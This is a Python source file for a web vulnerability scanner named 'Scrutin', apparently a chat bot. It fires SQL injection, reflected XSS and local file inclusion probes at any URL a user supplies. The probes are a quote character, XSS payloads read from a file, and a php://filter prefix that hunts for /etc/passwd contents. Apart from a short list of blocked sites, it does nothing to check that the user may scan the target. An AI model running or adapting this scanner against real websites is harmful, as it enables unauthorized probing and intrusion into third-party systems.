#!bin/bash/python3
# -*- coding: utf-8 -*-
from subprocess import check_output,Popen,PIPE
from random import choice
import socket
import re
import os
import time

from requests import get
from urllib.parse import urlsplit


def remove_case_html(raw_html):
  cleanr = re.compile('<.*?>')
  cleartext = re.sub(cleanr, '', raw_html)
  return cleartext

def dir_sql(sql,xhtml):
    try:
        erro = re.search(r''+sql+'.+',xhtml).group()
        return re.search(r'([a-zA-Z]?)+\/[a-zA-Z0-9.-_]+', erro).group()
    except AttributeError:
        return 'Not found'

def randomAgent():
    with open("Externos/UserAgents.txt") as users:
        return choice(users.read().splitlines())

def valid_url(url):
    if("http://" not in url and "https://" not in url):
        return "http://{}".format(url)
    return url

def filter_sites(url):
    b_list = ['www.google.com','www.facebook.com','www.cielo.com.br','www.github.com',
    'www.gitlab.com','www.stackoverflow.com','www.crefisa.com.br']
    if url in b_list:
        return False
    return True

def get_server_information(req_headers):
    try:
        info = {}
        info['server'] = req_headers['Server']
        info['technology'] = req_headers['X-Powered-By']
        return info
    except:
        try:
            info['server'] = req_headers['Server']
            info['technology'] = 'Not Found'
            return info
        except Exception as e:
            print(e)
            info['server'] = 'Not found'
            info['technology'] = 'Not found'
            return info
class Scans:

    def __init__(self,text):
        self.target = text.get('text')
        self.targetS = self.target.split(' ')
        self.headers = {
            'User-Agent': randomAgent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'Keep-alive',
        }

    def sql_injection(self):
        try:
            Vulns_List = ["mysqli_fetch_assoc()","mysql_num_rows()", "mysql_fetch_array()", "Error Occurred While Processing Request", "Server Error in '/' Application", "Microsoft OLE DB Provider for ODBC Drivers error", "error in your SQL syntax", "Invalid Querystring","OLE DB Provider for ODBC", "VBScript Runtime", "ADODB.Field", "BOF or EOF", "ADODB.Command", "JET Database", "mysql_fetch_row()","Syntax error", "mysql_fetch_assoc()","mysql_fetch_object()", "mysql_numrows()", "GetArray()", "FetchRow()","Input string was not in a correct format", "session_start()", "array_merge()", "preg_match()", "ilesize()", "filesize()","SQL Error", "[MySQL][ODBC 5.1 Driver][mysqld-4.1.22-community-nt-log]You have an error in your SQL syntax", "You have an error in your SQL syntax", "mysql_query()", "mysql_fetch_object()", "Query failed:", "Warning include() [function.include]", "mysql_num_rows()", "Database Query Failed", "mysql_fetch_assoc()", "mysql_free_result()", "Query failed (SELECT * FROM WHERE id = )", "num_rows", "Error Executing Database Query","Unclosed quotation mark", "Error Occured While Processing Request", "FetchRows()", "Microsoft JET Database", "ODBC Microsoft Access Driver", "OLE DB Provider for SQL Server", "SQLServer JDBC Driver","Error Executing Database Query", "ORA-01756", "getimagesize()", "unknown()", "mysql_result()", "pg_exec()", "require()","Microsoft JET Database", "ADODB.Recordset", "500 - Internal server error", "Microsoft OLE DB Provider", "Unclosed quotes", "ADODB.Command", "ADODB.Field error", "Microsoft VBScript", "Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark", "Microsoft OLE DB Provider for Oracle", "Active Server Pages error", "OLE/DB provider returned message", "OLE DB Provider for ODBC", "Unclosed quotation mark after the character string", "SQL Server", "Warning: odbc_","ORA-00921: unexpected end of SQL command", "ORA-01756", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended","DB2 ODBC", "DB2 error", "DB2 Driver","ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver","Warning: pg_", "PostgreSql Error:", "function.pg", "Supplied argument is not a valid PostgreSQL result", "PostgreSQL query failed: ERROR: parser: parse error", ": pg_","Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "sybase_", "ODBC Driver","java.sql.SQLSyntaxErrorException: ORA-", "org.springframework.jdbc.BadSqlGrammarException:", "javax.servlet.ServletException:", "java.lang.NullPointerException","Error Executing Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver","java.io.IOException: InfinityDB","Warning: include", "Fatal error: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include","Disallowed Parent Path", "function.require", "Warning: main", r"Warning: session_start\(\)", r"Warning: getimagesize\(\)", r"Warning: array_merge\(\)", r"Warning: preg_match\(\)",r"GetArray\(\)", r"FetchRow\(\)", "Warning: preg_", r"Warning: ociexecute\(\)", r"Warning: ocifetchstatement\(\)", "PHP Warning:","Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF","Unclosed quotation mark", "Error converting data type varchar to numeric","LuaPlayer ERROR:", "CGILua message", "Lua error","Incorrect syntax near", "Fatal error", "Invalid Querystring", "Input string was not in a correct format", "An illegal character has been found in the statement","MariaDB server version for the right syntax"]
            for vuln in Vulns_List:
                url = urlsplit(url=self.targetS[1])
                try:
                    if url.query:
                        if filter_sites(url.hostname):
                            payload = '%27'
                            req = get(valid_url(self.targetS[1])+payload,headers=self.headers)
                            html = req.text

                            if re.search(vuln,html):
                                diretorio = remove_case_html(dir_sql(vuln,html))
                                server = get_server_information(req_headers=req.headers)
                                return "<b>Scrutin - Scanner : SQL</b>\n\n<b>[+] Url_Target : </b> {} \n<b>[+] SQL Error : </b><code>{}</code> \n<b>[+] Payload : </b><code>{}</code>\n<b>[+] Directory : </b><code>{}</code>\n<b>[+] Server : </b><code>{}</code>\n<b>[+] Technology : </b><code>{}</code>\n<b>[+] HTTP Method : </b> <code>GET</code>".format(self.targetS[1],vuln,payload,diretorio,server['server'],server['technology'])
                        else:
                            return "<b>Scrutin - Scanner : SQL</b>\n\n<b>[+] Url_Target : </b> {}\n<b>[!] Error : </b> <code>This site has been blocked for scanning</code>".format(self.targetS[1])
                    else:
                        return "<b>Scrutin - Scanner : SQL</b>\n\n<b>[+] Url_Target : </b> {}\n\n<b>[!] Error :</b> <code>The url does not contain parameters for injection of payloads</code>".format(self.targetS[1])
                except:
                    return '<b>Scrutin - Scanner : SQL</b>\n\n<b>[+] Url_Target : </b> {}\n<b>[!] Error : </b> <code>Not found</code>'.format(self.targetS[1])
        except:
            return "<b>Scrutin - Scanner : SQL</b>\n\n<b>[!] Error : </b> <code>Could not access payload list</code>"
    
    def XSS(self):
        try:
            with open('Externos/XSS.txt','r',encoding='utf-8') as payloads:
                for payload in payloads.readlines():
                    payload = payload.strip()
                    url = urlsplit(url=self.targetS[1])
                    try:
                        if url.query:
                            if filter_sites(url.hostname):
                                req = get(valid_url(self.targetS[1])+payload,headers=self.headers)
                                html = req.text
                                server = get_server_information(req.headers)

                                if payload in html:
                                    return "*Scrutin - Scanner : XSS*\n\n*[+] Url_Target : *{}\n*[+] Payload : *`{}`\n*[+] Server : *`{}`\n*[+] Technology : *`{}`\n*[+] Content-Type : *`{}`\n*[+] HTTP Method : * `GET`".format(self.targetS[1],payload,server['server'],server['technology'],req.headers['Content-Type'])
                                return "*Scrutin - Scanner : XSS*\n\n*[+] Url_Target : * {}\n*[!] Error :*  `Not found`".format(self.targetS[1])
                            else:
                                return "*Scrutin - Scanner : XSS*\n\n*[+] Url_Target : * {}\n*[!] Error :*  `This site has been blocked for scanning`".format(self.targetS[1])
                        else:
                            return "*Scrutin - Scanner : XSS*\n\n*[+] Url_Target : * {}\n\n*[!] Error :* `The url does not contain parameters for injection of payloads`".format(self.targetS[1])
                    except:
                        return "*Scrutin - Scanner : XSS*\n\n*[+] Url_Target : * {}\n*[!] Error :*  `Problems connecting to the website`".format(self.targetS[1])                      
        except:
            return "*Scrutin - Scanner : XSS*\n\n*[!] Error : * `Could not access payload list`"
    
    def LFI(self):
        try:
            with open('Externos/LFI.txt','r',encoding='utf-8') as f:
                for payload in f.readlines():
                    payload = payload.strip()
                    bypass = "php://filter/resource="
                    url = urlsplit(url=self.targetS[1])
                    try:
                        if url.query:
                            if filter_sites(url.hostname):
                                req = get(valid_url(self.targetS[1])+bypass+payload,headers=self.headers)
                                html = req.text
                                server = get_server_information(req.headers)

                                if "root:x:0:0:root:/root:/bin/bash" in html:
                                    return "<b>Scrutin - Scanner : LFI</b>\n\n<b>[+] Url_Target : </b>{}\n<b>[+] Payload : </b><code>{}</code>\n<b>[+] Server : </b><code>{}</code>\n<b>[+] Technology : </b><code>{}</code>\n<b>[+] Content-Type : </b><code>{}</code>\n<b>[+] HTTP Method : </b> <code>GET</code>".format(self.targetS[1],bypass+payload,server['server'],server['technology'],req.headers['Content-Type'])
                                return "<b>Scrutin - Scanner : LFI</b>\n\n<b>[+] Url_Target : </b> {}\n\n<b>[!] Error : </b> <code>Not found</code>".format(self.targetS[1])
                            else:
                                return "<b>Scrutin - Scanner : LFI</b>\n\n<b>[+] Url_Target : </b> {}\n\n<b>[!] Error :</b>  <code>This site has been blocked for scanningI</code>".format(self.targetS[1])
                        else:
                            return "<b>Scrutin - Scanner : LFI</b>\n\n<b>[+] Url_Target : </b> {}\n\n<b>[!] Error :</b> <code>The url does not contain parameters for injection of payloads</code>".format(self.targetS[1])
                    except:
                        return "<b>Scrutin - Scanner : LFI</b>\n\n<b>[+] Url_Target : </b> {}\n\n<b>[!] Error : </b> <code>Problems connecting to the website</code>".format(self.targetS[1])
        except:
            return "<b>Scrutin - Scanner : LFI</b>\n\n<b>[!] Error : </b> <code>Could not access payload list</code>"
